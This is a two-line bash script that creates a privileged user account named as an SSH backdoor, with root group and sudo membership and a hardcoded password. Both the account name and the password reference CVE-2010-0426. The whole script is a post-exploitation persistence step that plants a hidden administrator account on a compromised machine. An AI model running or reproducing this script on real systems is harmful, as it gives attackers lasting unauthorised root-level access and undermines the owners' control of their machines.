#!/usr/bin/env bash

useradd -rm -d /home/ssh_backdoor_cve10_0426pwn -s /bin/bash -g root -G sudo -p $(openssl passwd -1 'cve_2010_0426_pwnedpw') ssh_backdoor_cve10_0426pwn